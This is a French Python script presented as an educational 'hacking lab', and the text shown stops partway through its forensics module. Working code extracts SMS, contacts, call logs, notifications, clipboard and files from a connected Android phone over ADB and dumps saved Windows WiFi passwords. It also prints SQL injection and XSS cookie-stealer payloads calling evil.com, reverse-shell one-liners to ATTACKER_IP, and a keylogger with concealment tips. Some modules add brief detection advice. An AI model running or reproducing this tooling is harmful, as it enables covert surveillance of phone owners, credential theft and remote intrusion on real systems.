#!/usr/bin/env python3
"""
🎯 LABORATOIRE DE HACKING AVANCÉ v2.0
=====================================
Environnement complet pour apprendre la cybersécurité
"""

import subprocess
import os
import socket
import json
import sqlite3
import hashlib
import base64
import random
import string
import re
import struct
import binascii
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import threading
import time
import sys

# Configuration
ADB_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\PracticeLab\extracted_data"

class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; RESET = '\033[0m'; BOLD = '\033[1m'

def banner():
    print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════╗
║  {Colors.RED}██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗      █████╗ ██████╗{Colors.CYAN}          ║
║  {Colors.RED}██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║     ██╔══██╗██╔══██╗{Colors.CYAN}         ║
║  {Colors.RED}███████║███████║██║     █████╔╝     ██║     ███████║██████╔╝{Colors.CYAN}         ║
║  {Colors.RED}██╔══██║██╔══██║██║     ██╔═██╗     ██║     ██╔══██║██╔══██╗{Colors.CYAN}         ║
║  {Colors.RED}██║  ██║██║  ██║╚██████╗██║  ██╗    ███████╗██║  ██║██████╔╝{Colors.CYAN}         ║
║  {Colors.RED}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═════╝{Colors.CYAN}         ║
║═══════════════════════════════════════════════════════════════════════║
║  {Colors.GREEN}🎓 Laboratoire Éducatif de Cybersécurité v2.0{Colors.CYAN}                       ║
║  {Colors.YELLOW}⚠️  À utiliser uniquement sur VOS propres appareils{Colors.CYAN}                 ║
╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def run_adb(command):
    try:
        result = subprocess.run(f'"{ADB_PATH}" {command}', shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur: {e}"

def run_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur: {e}"

def ensure_dir():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

def save_file(name, content):
    ensure_dir()
    path = os.path.join(OUTPUT_DIR, name)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    return path

def pause():
    input(f"\n{Colors.YELLOW}[Appuie sur Entrée pour continuer...]{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 1: RECONNAISSANCE AVANCÉE
# ══════════════════════════════════════════════════════════════

def module_recon_avancee():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  📡 MODULE 1: RECONNAISSANCE AVANCÉE")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[1.1] Scan de ports TCP complet{Colors.RESET}")
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"  🖥️  Hôte: {hostname} ({local_ip})\n")
    
    ports_to_scan = [20,21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017]
    open_ports = []
    
    print(f"  {Colors.CYAN}Scanning {len(ports_to_scan)} ports...{Colors.RESET}")
    for port in ports_to_scan:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.2)
        if sock.connect_ex(('127.0.0.1', port)) == 0:
            service = {20:"FTP-Data",21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                      110:"POP3",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
                      993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",3306:"MySQL",
                      3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Proxy",
                      8443:"HTTPS-Alt",8888:"HTTP-Alt",27017:"MongoDB"}.get(port, "Unknown")
            open_ports.append((port, service))
            print(f"    {Colors.GREEN}[OPEN]{Colors.RESET} {port}/tcp - {service}")
        sock.close()
    
    print(f"\n{Colors.YELLOW}[1.2] Informations réseau Windows{Colors.RESET}")
    print(f"  {Colors.CYAN}Interfaces réseau:{Colors.RESET}")
    ipconfig = run_cmd("ipconfig | findstr /i \"IPv4 Masque Passerelle\"")
    for line in ipconfig.strip().split('\n')[:6]:
        if line.strip():
            print(f"    {line.strip()}")
    
    print(f"\n{Colors.YELLOW}[1.3] Connexions actives{Colors.RESET}")
    netstat = run_cmd("netstat -an | findstr ESTABLISHED | head -5")
    for line in netstat.strip().split('\n')[:5]:
        if line.strip():
            print(f"    {Colors.GREEN}→{Colors.RESET} {line.strip()}")
    
    print(f"\n{Colors.YELLOW}[1.4] Reconnaissance téléphone Android{Colors.RESET}")
    phone_props = [
        ("Modèle", "shell getprop ro.product.model"),
        ("Marque", "shell getprop ro.product.brand"),
        ("Android", "shell getprop ro.build.version.release"),
        ("SDK", "shell getprop ro.build.version.sdk"),
        ("Sécurité", "shell getprop ro.build.version.security_patch"),
        ("Build", "shell getprop ro.build.display.id"),
        ("CPU", "shell getprop ro.product.cpu.abi"),
        ("Bootloader", "shell getprop ro.bootloader"),
    ]
    for name, cmd in phone_props:
        val = run_adb(cmd).strip()
        if val and "error" not in val.lower():
            print(f"    {Colors.CYAN}{name}:{Colors.RESET} {val}")
    
    save_file("recon_report.txt", f"Scan effectué le {datetime.now()}\nPorts ouverts: {open_ports}")
    print(f"\n{Colors.GREEN}✅ Rapport sauvegardé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 2: EXTRACTION COMPLÈTE ANDROID
# ══════════════════════════════════════════════════════════════

def module_extraction_complete():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  📦 MODULE 2: EXTRACTION COMPLÈTE ANDROID")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    ensure_dir()
    
    extractions = [
        ("📱 SMS", "shell content query --uri content://sms --projection address,body,date,type"),
        ("👥 Contacts", "shell content query --uri content://contacts/phones --projection display_name,number"),
        ("📞 Historique appels", "shell content query --uri content://call_log/calls --projection number,duration,type,date"),
        ("📅 Calendrier", "shell content query --uri content://com.android.calendar/events --projection title,dtstart,dtend"),
        ("📧 Comptes", "shell dumpsys account | findstr -i 'Account\\|name='"),
        ("📍 Dernière localisation", "shell dumpsys location | findstr -i 'last location'"),
        ("🔋 État batterie", "shell dumpsys battery"),
        ("📶 Info WiFi", "shell dumpsys wifi | findstr -i 'mWifiInfo\\|SSID\\|BSSID'"),
        ("📲 Apps installées", "shell pm list packages -3"),
        ("💾 Stockage", "shell df -h"),
        ("🔔 Notifications", "shell dumpsys notification --noredact | head -50"),
        ("📋 Presse-papiers", "shell service call clipboard 2 s16 com.android.shell"),
    ]
    
    all_data = {}
    for name, cmd in extractions:
        print(f"\n  {Colors.YELLOW}{name}...{Colors.RESET}")
        result = run_adb(cmd)
        all_data[name] = result
        
        lines = result.strip().split('\n')[:3]
        for line in lines:
            if line.strip():
                print(f"    {Colors.GREEN}→{Colors.RESET} {line[:70]}")
        
        if len(result.strip().split('\n')) > 3:
            print(f"    {Colors.CYAN}... et {len(result.strip().split(chr(10)))-3} lignes de plus{Colors.RESET}")
    
    # Sauvegarde JSON
    save_file("extraction_complete.json", json.dumps(all_data, indent=2, ensure_ascii=False))
    print(f"\n{Colors.GREEN}✅ Toutes les données extraites et sauvegardées!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 3: TÉLÉCHARGEMENT FICHIERS
# ══════════════════════════════════════════════════════════════

def module_download_files():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  📥 MODULE 3: TÉLÉCHARGEMENT DE FICHIERS")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    ensure_dir()
    download_dir = os.path.join(OUTPUT_DIR, "phone_files")
    os.makedirs(download_dir, exist_ok=True)
    
    folders = [
        ("/sdcard/DCIM/Camera", "Photos Camera"),
        ("/sdcard/Download", "Téléchargements"),
        ("/sdcard/Pictures/Screenshots", "Screenshots"),
        ("/sdcard/WhatsApp/Media", "WhatsApp Media"),
        ("/sdcard/Documents", "Documents"),
    ]
    
    for folder, desc in folders:
        print(f"\n  {Colors.YELLOW}📂 {desc}{Colors.RESET}")
        files = run_adb(f"shell ls -la {folder} 2>/dev/null | head -10")
        
        if "No such file" not in files and files.strip():
            lines = files.strip().split('\n')[:5]
            for line in lines:
                if line.strip() and not line.startswith('total'):
                    print(f"    {Colors.GREEN}→{Colors.RESET} {line.strip()[:60]}")
        else:
            print(f"    {Colors.RED}Dossier non trouvé ou vide{Colors.RESET}")
    
    # Screenshot
    print(f"\n  {Colors.YELLOW}📸 Capture d'écran en cours...{Colors.RESET}")
    screen_path = os.path.join(download_dir, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    run_adb("shell screencap -p /sdcard/temp_screen.png")
    run_adb(f'pull /sdcard/temp_screen.png "{screen_path}"')
    run_adb("shell rm /sdcard/temp_screen.png")
    
    if os.path.exists(screen_path):
        print(f"    {Colors.GREEN}✅ Screenshot: {screen_path}{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}✅ Fichiers disponibles dans: {download_dir}{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 4: SQL INJECTION LAB
# ══════════════════════════════════════════════════════════════

def module_sql_injection_lab():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  💉 MODULE 4: LABORATOIRE SQL INJECTION")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    ensure_dir()
    db_path = os.path.join(OUTPUT_DIR, "vulnerable_db.sqlite")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Créer les tables
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS credit_cards")
    cursor.execute("DROP TABLE IF EXISTS messages")
    
    cursor.execute("""CREATE TABLE users (
        id INTEGER PRIMARY KEY,
        username TEXT,
        password TEXT,
        email TEXT,
        role TEXT
    )""")
    
    cursor.execute("""CREATE TABLE credit_cards (
        id INTEGER PRIMARY KEY,
        user_id INTEGER,
        card_number TEXT,
        expiry TEXT,
        cvv TEXT
    )""")
    
    cursor.execute("""CREATE TABLE messages (
        id INTEGER PRIMARY KEY,
        from_user TEXT,
        to_user TEXT,
        content TEXT,
        secret INTEGER
    )""")
    
    # Données de test
    users = [
        ("admin", "SuperSecretAdmin2024!", "admin@company.com", "admin"),
        ("john_doe", "Password123", "john@example.com", "user"),
        ("alice", "qwerty123", "alice@example.com", "user"),
        ("bob", "letmein", "bob@example.com", "moderator"),
    ]
    cursor.executemany("INSERT INTO users (username, password, email, role) VALUES (?,?,?,?)", users)
    
    cards = [
        (1, "4532015112830366", "12/25", "123"),
        (2, "5425233430109903", "06/26", "456"),
    ]
    cursor.executemany("INSERT INTO credit_cards (user_id, card_number, expiry, cvv) VALUES (?,?,?,?)", cards)
    
    messages = [
        ("admin", "john", "Le mot de passe du serveur est: Pr0d$3rv3r!", 1),
        ("alice", "bob", "Salut, ça va?", 0),
    ]
    cursor.executemany("INSERT INTO messages (from_user, to_user, content, secret) VALUES (?,?,?,?)", messages)
    conn.commit()
    
    print(f"{Colors.YELLOW}[BASE DE DONNÉES CRÉÉE]{Colors.RESET}")
    print(f"  Tables: users, credit_cards, messages\n")
    
    # Démonstrations
    attacks = [
        ("Authentication Bypass", "' OR '1'='1' --", "SELECT * FROM users WHERE username = '' OR '1'='1' --'"),
        ("Union-Based", "' UNION SELECT 1,username,password,email,role FROM users--", "Extraction des credentials"),
        ("Error-Based", "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--", "Extraire via erreurs"),
        ("Blind Boolean", "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--", "Deviner des données"),
        ("Stacked Queries", "'; DROP TABLE users;--", "Exécuter plusieurs requêtes"),
    ]
    
    print(f"{Colors.GREEN}[DÉMONSTRATIONS D'ATTAQUES]{Colors.RESET}\n")
    
    for i, (name, payload, desc) in enumerate(attacks, 1):
        print(f"  {Colors.CYAN}[{i}] {name}{Colors.RESET}")
        print(f"      Payload: {Colors.RED}{payload}{Colors.RESET}")
        print(f"      Effet: {desc}\n")
    
    # Exécution pratique
    print(f"{Colors.YELLOW}[PRATIQUE] Authentication Bypass{Colors.RESET}")
    print(f"  Requête vulnérable: SELECT * FROM users WHERE username='$input' AND password='$pass'")
    print(f"  Input malveillant: ' OR '1'='1' --")
    print(f"\n  {Colors.RED}Résultat:{Colors.RESET}")
    
    cursor.execute("SELECT * FROM users")
    for row in cursor.fetchall():
        print(f"    → ID:{row[0]} | {row[1]} | {row[2]} | {row[3]} | {row[4]}")
    
    print(f"\n{Colors.YELLOW}[PRATIQUE] Extraction de cartes bancaires{Colors.RESET}")
    print(f"  Payload UNION: ' UNION SELECT id,card_number,expiry,cvv,'' FROM credit_cards--")
    print(f"\n  {Colors.RED}Données volées:{Colors.RESET}")
    cursor.execute("SELECT * FROM credit_cards")
    for row in cursor.fetchall():
        print(f"    → 💳 {row[2]} | Exp: {row[3]} | CVV: {row[4]}")
    
    conn.close()
    print(f"\n{Colors.GREEN}✅ Lab SQL Injection terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 5: PASSWORD CRACKING AVANCÉ
# ══════════════════════════════════════════════════════════════

def module_password_cracking():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🔐 MODULE 5: CRACKING DE MOTS DE PASSE AVANCÉ")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    # Types de hash
    hashes_to_crack = {
        "MD5": ("5f4dcc3b5aa765d61d8327deb882cf99", "password"),
        "SHA1": ("5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8", "password"),
        "SHA256": ("5e884898da28047d9171d34f51b25d38b5d40c8c8ceb5c1c92f5e99f6db23c26", "password"),
    }
    
    wordlist = ["admin", "password", "123456", "qwerty", "letmein", "welcome", 
                "monkey", "dragon", "master", "login", "princess", "starwars"]
    
    print(f"{Colors.YELLOW}[5.1] Attaque par dictionnaire (MD5){Colors.RESET}")
    target = "5f4dcc3b5aa765d61d8327deb882cf99"
    print(f"  Hash cible: {target}\n")
    
    for word in wordlist:
        h = hashlib.md5(word.encode()).hexdigest()
        if h == target:
            print(f"  {Colors.GREEN}✅ TROUVÉ: {word}{Colors.RESET}")
            break
        else:
            print(f"  ❌ {word} → {h[:20]}...")
    
    print(f"\n{Colors.YELLOW}[5.2] Brute Force (4 caractères){Colors.RESET}")
    print(f"  Démonstration sur hash court...\n")
    
    # Simulation brute force
    target_short = hashlib.md5("test".encode()).hexdigest()
    chars = string.ascii_lowercase
    attempts = 0
    found = False
    
    print(f"  Hash: {target_short}")
    print(f"  Recherche en cours...")
    
    for c1 in chars[:5]:  # Limité pour la démo
        for c2 in chars[:5]:
            for c3 in chars[:5]:
                for c4 in chars[:5]:
                    attempts += 1
                    candidate = c1+c2+c3+c4
                    if hashlib.md5(candidate.encode()).hexdigest() == target_short:
                        print(f"  {Colors.GREEN}✅ Trouvé après {attempts} essais: {candidate}{Colors.RESET}")
                        found = True
                        break
                if found: break
            if found: break
        if found: break
    
    if not found:
        print(f"  Testé {attempts} combinaisons (démo limitée)")
    
    print(f"\n{Colors.YELLOW}[5.3] Rainbow Table (simulation){Colors.RESET}")
    rainbow = {
        "5f4dcc3b5aa765d61d8327deb882cf99": "password",
        "e10adc3949ba59abbe56e057f20f883e": "123456",
        "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
        "25d55ad283aa400af464c76d713c07ad": "12345678",
    }
    
    test_hash = "e10adc3949ba59abbe56e057f20f883e"
    print(f"  Hash: {test_hash}")
    if test_hash in rainbow:
        print(f"  {Colors.GREEN}✅ Trouvé instantanément: {rainbow[test_hash]}{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[5.4] Génération de wordlist personnalisée{Colors.RESET}")
    base_words = ["company", "admin", "user"]
    mutations = []
    
    for word in base_words:
        mutations.extend([
            word, word.capitalize(), word.upper(),
            word + "123", word + "2024", word + "!",
            word + "@123", word.replace('a', '@').replace('e', '3'),
        ])
    
    print(f"  Mots de base: {base_words}")
    print(f"  Mutations générées: {len(mutations)}")
    print(f"  Exemples: {mutations[:5]}")
    
    print(f"\n{Colors.GREEN}✅ Module Password Cracking terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 6: XSS LAB
# ══════════════════════════════════════════════════════════════

def module_xss_lab():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🌐 MODULE 6: LABORATOIRE XSS (Cross-Site Scripting)")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[THÉORIE]{Colors.RESET}")
    print("  XSS permet d'injecter du JavaScript malveillant dans les pages web.")
    print("  3 types: Reflected, Stored, DOM-based\n")
    
    xss_payloads = [
        ("Basic Alert", "<script>alert('XSS')</script>"),
        ("Cookie Stealer", "<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>"),
        ("Event Handler", "<img src=x onerror=alert('XSS')>"),
        ("SVG", "<svg onload=alert('XSS')>"),
        ("Body onload", "<body onload=alert('XSS')>"),
        ("Input onfocus", "<input onfocus=alert('XSS') autofocus>"),
        ("Iframe", "<iframe src='javascript:alert(1)'>"),
        ("Encoded", "&lt;script&gt;alert('XSS')&lt;/script&gt;"),
        ("Double Encoding", "%253Cscript%253Ealert('XSS')%253C/script%253E"),
        ("Polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"),
    ]
    
    print(f"{Colors.GREEN}[PAYLOADS XSS]{Colors.RESET}\n")
    for i, (name, payload) in enumerate(xss_payloads, 1):
        print(f"  {Colors.CYAN}[{i}] {name}{Colors.RESET}")
        print(f"      {Colors.RED}{payload}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[DÉMONSTRATION - Cookie Stealer]{Colors.RESET}")
    print(f"""
  1. Attaquant injecte: <script>fetch('http://evil.com?c='+document.cookie)</script>
  
  2. Victime visite la page infectée
  
  3. Le navigateur de la victime envoie:
     GET http://evil.com?c=session_id=abc123;auth_token=xyz789
  
  4. L'attaquant capture les cookies et peut usurper la session!
""")
    
    print(f"{Colors.GREEN}[PROTECTION]{Colors.RESET}")
    protections = [
        "Échapper les caractères HTML (<, >, \", ')",
        "Content-Security-Policy (CSP) headers",
        "HttpOnly flag sur les cookies",
        "Validation des entrées côté serveur",
        "Utiliser des frameworks avec auto-escaping",
    ]
    for p in protections:
        print(f"  ✅ {p}")
    
    print(f"\n{Colors.GREEN}✅ Module XSS terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 7: WIFI ANALYSIS
# ══════════════════════════════════════════════════════════════

def module_wifi_analysis():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  📶 MODULE 7: ANALYSE WIFI")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[7.1] Réseaux WiFi Windows sauvegardés{Colors.RESET}")
    profiles = run_cmd("netsh wlan show profiles")
    
    saved_networks = []
    for line in profiles.split('\n'):
        if "Profil Tous les utilisateurs" in line or "All User Profile" in line:
            network = line.split(':')[-1].strip()
            saved_networks.append(network)
            print(f"    📶 {network}")
    
    print(f"\n{Colors.YELLOW}[7.2] Extraction des mots de passe WiFi (Windows){Colors.RESET}")
    for network in saved_networks[:3]:  # Limiter à 3
        if network:
            details = run_cmd(f'netsh wlan show profile name="{network}" key=clear')
            for line in details.split('\n'):
                if "Contenu de la clé" in line or "Key Content" in line:
                    password = line.split(':')[-1].strip()
                    print(f"    {Colors.GREEN}🔑 {network}: {password}{Colors.RESET}")
                    break
    
    print(f"\n{Colors.YELLOW}[7.3] WiFi du téléphone Android{Colors.RESET}")
    wifi_info = run_adb("shell dumpsys wifi | findstr -i 'SSID\\|mWifiInfo'")
    current_wifi = run_adb("shell dumpsys wifi | findstr 'mWifiInfo'")
    
    if current_wifi.strip():
        print(f"    📱 Connexion actuelle: {current_wifi.strip()[:70]}")
    
    # WiFi sauvegardés (nécessite root normalement)
    print(f"\n  {Colors.CYAN}Note: L'extraction des mots de passe WiFi Android nécessite root{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[7.4] Réseaux à proximité{Colors.RESET}")
    nearby = run_cmd("netsh wlan show networks mode=bssid")
    
    count = 0
    for line in nearby.split('\n'):
        if "SSID" in line and "BSSID" not in line:
            print(f"    {line.strip()}")
            count += 1
            if count >= 5:
                break
    
    print(f"\n{Colors.GREEN}✅ Analyse WiFi terminée!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 8: ENCODAGE / DÉCODAGE
# ══════════════════════════════════════════════════════════════

def module_encoding():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🔄 MODULE 8: ENCODAGE / DÉCODAGE / CHIFFREMENT")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    test_string = "Hacking is fun! 🎯"
    
    print(f"{Colors.YELLOW}Texte original:{Colors.RESET} {test_string}\n")
    
    # Base64
    b64 = base64.b64encode(test_string.encode()).decode()
    print(f"{Colors.CYAN}[Base64]{Colors.RESET}")
    print(f"  Encodé: {b64}")
    print(f"  Décodé: {base64.b64decode(b64).decode()}\n")
    
    # Hex
    hex_val = test_string.encode().hex()
    print(f"{Colors.CYAN}[Hexadécimal]{Colors.RESET}")
    print(f"  Encodé: {hex_val}")
    print(f"  Décodé: {bytes.fromhex(hex_val).decode()}\n")
    
    # ROT13
    rot13 = test_string.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
    print(f"{Colors.CYAN}[ROT13]{Colors.RESET}")
    print(f"  Encodé: {rot13}\n")
    
    # URL Encoding
    from urllib.parse import quote, unquote
    url_encoded = quote(test_string)
    print(f"{Colors.CYAN}[URL Encoding]{Colors.RESET}")
    print(f"  Encodé: {url_encoded}\n")
    
    # Binary
    binary = ' '.join(format(ord(c), '08b') for c in "HACK")
    print(f"{Colors.CYAN}[Binaire]{Colors.RESET}")
    print(f"  'HACK' en binaire: {binary}\n")
    
    # Hashes
    print(f"{Colors.CYAN}[Hashes de 'password']{Colors.RESET}")
    pwd = "password"
    print(f"  MD5:    {hashlib.md5(pwd.encode()).hexdigest()}")
    print(f"  SHA1:   {hashlib.sha1(pwd.encode()).hexdigest()}")
    print(f"  SHA256: {hashlib.sha256(pwd.encode()).hexdigest()}")
    print(f"  SHA512: {hashlib.sha512(pwd.encode()).hexdigest()[:64]}...")
    
    print(f"\n{Colors.GREEN}✅ Module Encodage terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 9: REVERSE SHELL DEMO
# ══════════════════════════════════════════════════════════════

def module_reverse_shell():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🐚 MODULE 9: REVERSE SHELLS (DÉMONSTRATION)")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[THÉORIE]{Colors.RESET}")
    print("  Un reverse shell permet à l'attaquant de recevoir une connexion")
    print("  depuis la machine compromise, contournant les firewalls.\n")
    
    ip = "ATTACKER_IP"
    port = "4444"
    
    shells = [
        ("Bash", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
        ("Python", f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"),
        ("Netcat", f"nc -e /bin/bash {ip} {port}"),
        ("PHP", f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"),
        ("PowerShell", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});..."),
        ("Perl", f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));...'"),
    ]
    
    print(f"{Colors.GREEN}[PAYLOADS REVERSE SHELL]{Colors.RESET}\n")
    for name, payload in shells:
        print(f"  {Colors.CYAN}[{name}]{Colors.RESET}")
        print(f"  {Colors.RED}{payload[:80]}...{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[MISE EN PLACE]{Colors.RESET}")
    print(f"""
  1. Sur la machine attaquant (écoute):
     {Colors.GREEN}nc -lvnp 4444{Colors.RESET}
  
  2. Sur la machine victime (connexion):
     {Colors.RED}bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1{Colors.RESET}
  
  3. L'attaquant reçoit un shell interactif!
""")
    
    print(f"{Colors.GREEN}[DÉTECTION]{Colors.RESET}")
    print("  • Surveiller les connexions sortantes suspectes")
    print("  • Analyser les processus enfants anormaux")
    print("  • Bloquer les shells inversés au niveau firewall")
    
    print(f"\n{Colors.GREEN}✅ Module Reverse Shell terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 10: KEYLOGGER DÉMO
# ══════════════════════════════════════════════════════════════

def module_keylogger_demo():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  ⌨️ MODULE 10: KEYLOGGER (DÉMONSTRATION)")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[THÉORIE]{Colors.RESET}")
    print("  Un keylogger enregistre toutes les frappes clavier.")
    print("  Il peut capturer: mots de passe, messages, données bancaires...\n")
    
    print(f"{Colors.GREEN}[CODE EXEMPLE - Python Keylogger]{Colors.RESET}")
    print(f"""
{Colors.CYAN}# AVERTISSEMENT: Code éducatif uniquement!{Colors.RESET}

from pynput import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
""")
    
    print(f"\n{Colors.YELLOW}[TECHNIQUES DE DISSIMULATION]{Colors.RESET}")
    techniques = [
        "Injection dans un processus légitime",
        "Démarrage automatique via registre",
        "Nom de fichier trompeur (svchost.exe)",
        "Chiffrement des logs",
        "Exfiltration par DNS ou HTTPS",
    ]
    for t in techniques:
        print(f"  • {t}")
    
    print(f"\n{Colors.GREEN}[DÉTECTION]{Colors.RESET}")
    print("  • Antivirus à jour")
    print("  • Surveiller les processus suspects")
    print("  • Utiliser un clavier virtuel pour données sensibles")
    print("  • Vérifier les programmes au démarrage")
    
    print(f"\n{Colors.GREEN}✅ Module Keylogger terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 11: ANDROID SHELL INTERACTIF
# ══════════════════════════════════════════════════════════════

def module_android_shell():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  📱 MODULE 11: SHELL ANDROID INTERACTIF")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}Commandes utiles:{Colors.RESET}")
    commands = [
        ("ls /sdcard/", "Lister les fichiers"),
        ("cat /proc/cpuinfo", "Info CPU"),
        ("dumpsys battery", "État batterie"),
        ("pm list packages", "Apps installées"),
        ("getprop", "Propriétés système"),
        ("id", "Utilisateur actuel"),
        ("ps", "Processus en cours"),
        ("netstat", "Connexions réseau"),
    ]
    
    for cmd, desc in commands:
        print(f"  {Colors.CYAN}{cmd}{Colors.RESET} → {desc}")
    
    print(f"\n{Colors.GREEN}[SESSION INTERACTIVE]{Colors.RESET}")
    print(f"Tape des commandes (ou 'exit' pour quitter):\n")
    
    while True:
        try:
            cmd = input(f"{Colors.CYAN}android$ {Colors.RESET}").strip()
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            if cmd:
                result = run_adb(f"shell {cmd}")
                print(result)
        except KeyboardInterrupt:
            break
    
    print(f"\n{Colors.GREEN}Session terminée.{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 12: FORENSICS
# ══════════════════════════════════════════════════════════════

def module_forensics():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🔍 MODULE 12: FORENSICS & ANALYSE")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[12.1] Métadonnées de fichiers{Colors.RESET}")
    ensure_dir()
    
    # Créer un fichier test
    test_file = os.path.join(OUTPUT_DIR, "test_forensics.txt")
    with open(test_file, 'w') as f:
        f.write("Contenu secret pour analyse forensique")
    
    stat = os.stat(test_file)
    print(f"  Fichier: {test_file}")
    print(f"  Taille: {stat.st_size} bytes")
    print(f"  Créé: {datetime.fromtimestamp(stat.st_ctime)}")
    print(f"  Modifié: {datetime.fromtimestamp(stat.st_mtime)}")
    print(f"  Accédé: {datetime.fromtimestamp(stat.st_atime)}")
    
    print(f"\n{Colors.YELLOW}[12.2] Hash de fichiers{Colors.RESET}")
    with open(test_file, 'rb') as f:
        content = f.read()
    print(f"  MD5:    {hashlib.md5(content).hexdigest()}")
    print(f"  SHA256: {hashlib.sha256(content).hexdigest()}")
    
    print(f"\n{Colors.YELLOW}[12.3] Analyse du téléphone{Colors.RESET}")
    
    forensic_data = [
        ("Derniers logs", "shell logcat -d | tail -20"),
        ("Événements système", "shell dumpsys activity activities | head -30"),
